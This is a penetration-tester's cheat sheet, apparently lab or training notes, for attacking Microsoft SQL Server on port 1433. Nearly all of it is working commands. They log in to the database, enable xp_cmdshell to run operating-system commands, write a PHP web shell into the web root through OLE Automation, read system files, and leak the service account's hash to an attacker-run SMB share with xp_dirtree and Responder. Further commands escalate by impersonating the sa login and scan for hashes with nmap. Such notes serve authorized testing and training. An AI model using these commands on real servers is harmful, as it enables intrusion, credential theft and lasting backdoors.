# TCP 1433 (MSSQL)

## Overview

During database enumeration, port 1433 is associated with Microsoft SQL Server and is commonly found in internal Windows environments. If exposed or weakly secured, it may allow authentication attempts against database accounts and potential access to sensitive data. In some cases, misconfigurations such as elevated privileges or enabled dangerous procedures can lead to command execution on the underlying host.

---
Linux
```
sqsh -S 10.129.20.13 -U username -P Password123
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

Windows
```
sqlcmd -S 10.129.20.13 -U username -P Password123
```

Command Execution
```
EXEC sp_configure 'show advanced options', 1;
```
```
RECONFIGURE;
```
```
EXEC sp_configure 'xp_cmdshell', 1;
```
```
RECONFIGURE;
```
```
EXECUTE xp_cmdshell 'whoami';
```

Write Files
Requires admin privileges
```
EXEC sp_configure 'show advanced options', 1;
```
```
RECONFIGURE;
```
```
EXEC sp_configure 'Ole Automation Procedures', 1;
```
```
RECONFIGURE;
```

```
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

Read Files
```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
```
GO
```

Capture MSSQL Service Hash
XP_DIRTREE
```
EXEC master..xp_dirtree '[\\10.10.110.17\share\](file://10.10.110.17/share/)'
GO
```
```
sudo responder -I tun0
```
```
impacket-smbserver share ./ -smb2support
```

Impersonation
First we find out who we can impersonate (sysadmins can impersonate anyone)
```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```
```
EXECUTE AS LOGIN = 'sa'
GO
```
Confirming if current user is sysadmin
```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
NOTE: run EXECUTE AS LOGIN in master DB

sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
